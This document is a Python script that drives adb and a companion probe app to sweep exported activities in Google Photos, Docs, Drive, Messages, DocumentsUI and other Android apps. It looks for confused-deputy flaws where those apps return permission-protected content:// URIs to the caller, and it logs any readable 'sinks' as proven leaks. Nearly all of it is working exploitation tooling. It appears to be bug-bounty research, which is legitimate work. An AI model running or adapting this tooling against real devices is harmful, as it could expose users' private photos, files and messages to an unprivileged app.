#!/usr/bin/env python3
"""
CONFUSED-DEPUTY SINK SWEEP via startActivityForResult.

Chain: exported activity (no permission) -> reads data with ITS OWN privileged permissions ->
returns a content:// Uri / Bundle to OUR caller -> we read it. We could never read it directly,
because every content provider on the device is permission-guarded.

If RESULT uri + SINK READABLE appear together, that is a proven Confidentiality sink.
"""
import json
import os
import re
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

EVID = os.path.join(os.path.dirname(HERE), "evidence")
PKG = "com.vrp.probe"
TGT = "com.vrp.probe/.ResultActivity"


def sh(c):
    return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=120)


# exported activities that plausibly RETURN data: pickers, share, viewers, editors, importers
TARGETS = [
    # (package, component, action, data, mime, label)
    ("com.google.android.apps.photos", "com.google.android.apps.photos.envelope.AlbumActivity",
     "android.intent.action.VIEW", "https://photos.google.com/album/X", None, "photos_album"),
    ("com.google.android.apps.photos", "com.google.android.apps.photos.envelope.AlbumActivity",
     "android.intent.action.PICK", None, "image/*", "photos_pick_image"),
    ("com.google.android.apps.docs", "com.google.android.apps.docs.share.activities.ShareActivity",
     "android.intent.action.SEND", None, "*/*", "docs_share_send"),
    ("com.google.android.apps.docs", None, "android.intent.action.SEND_MULTIPLE", None, "*/*",
     "docs_share_multi"),
    ("com.android.documentsui", None, "android.intent.action.OPEN_DOCUMENT", None, "*/*",
     "documentsui_open"),
    ("com.google.android.apps.messaging", None, "android.intent.action.SEND", None, "*/*",
     "messages_share"),
    ("com.google.android.googlequicksearchbox", None, "android.intent.action.SEND", None,
     "image/*", "agsa_share_image"),
    ("com.google.android.googlequicksearchbox", None, "android.intent.action.VIEW", None,
     "image/jpeg", "agsa_view_image"),
    ("com.google.android.apps.photos", None, "android.intent.action.PICK", None, "image/*",
     "photos_pick2"),
    ("com.android.gallery3d", None, "android.intent.action.PICK", None, "image/*",
     "gallery_pick"),
    ("com.google.android.apps.drive", None, "android.intent.action.OPEN_DOCUMENT", None, "*/*",
     "drive_open"),
    ("com.google.android.apps.photos", None, "android.intent.action.SEND", None, "image/*",
     "photos_share_in"),
]

EXTRA_SET = ' --es com.vrp.probe.LABEL "{lbl}"'


def fire(pkg, comp, action, data, mime, lbl):
    sh("adb logcat -c")
    args = [f"adb shell am start -n {TGT}",
            f'-a "{action}"']
    if comp:
        args.append(f"--es com.vrp.probe.TARGET {pkg}/{comp}")
    if data:
        args.append(f'-d "{data}"')
    if mime:
        args.append(f'-t "{mime}"')
    args.append(f'--es com.vrp.probe.LABEL {lbl}')
    r = sh(" ".join(args))
    time.sleep(6)
    log = sh("adb logcat -d -v time").stdout
    with open(os.path.join(EVID, f"res_{lbl}.full.txt"), "w") as fh:
        fh.write(f"CMD: {r.stdout}\n{log}")
    return r.stdout, log


RES = re.compile(r"RESULT_RECV|RESULT_DATA|RESULT_EXTRAS|RESULT uri|RESULT_URI")
SINK = re.compile(r"SINK READABLE|SINK STREAM_OPEN|SINK query")

if __name__ == "__main__":
    # The probe forwards a target component via an extra; add a tiny resolver in the activity
    # path by using `am start` with the component directly is not possible for for-result, so we
    # use the extra indirection implemented in Probe.dispatch -> "result" command.
    hits = 0
    for pkg, comp, action, data, mime, lbl in TARGETS:
        cmd = {"type": "result", "action": action,
               "data": data, "mimeType": mime,
               "pkg": pkg,
               "component": (pkg + "/" + comp) if comp else None,
               "label": lbl}
        cmd = {k: v for k, v in cmd.items() if v is not None}
        with open("/tmp/vrp_cmd.json", "w") as fh:
            json.dump(cmd, fh)
        sh("mkdir -p /sdcard/Android/data/com.vrp.probe/files")
        subprocess.run(["adb", "push", "/tmp/vrp_cmd.json",
                        "/sdcard/Android/data/com.vrp.probe/files/cmd.json"],
                       capture_output=True)
        # BAL: must dispatch from a VISIBLE activity -> run the command via UiActivity,
        # which executes the command file in the foreground.
        sh(f"adb shell am start -n com.vrp.probe/.UiActivity >/dev/null 2>&1")
        time.sleep(8)
        log = sh("adb logcat -d -v time").stdout
        with open(os.path.join(EVID, f"res_{lbl}.full.txt"), "w") as fh:
            fh.write(f"CMD: {json.dumps(cmd)}\n{log}")
        keep = [l for l in log.splitlines() if RES.search(l) or SINK.search(l)]
        status = "RESULT" if keep else "no-result"
        print(f"\n### {lbl}  [{status}]  {pkg}")
        for l in keep[:14]:
            print("   " + l.split("VRPPROBE: ", 1)[-1][:280])
        if SINK.search(log) or any("SINK READABLE" in l or "SINK STREAM_OPEN" in l for l in keep):
            hits += 1
    print(f"\n\nSINKS PROVEN: {hits}")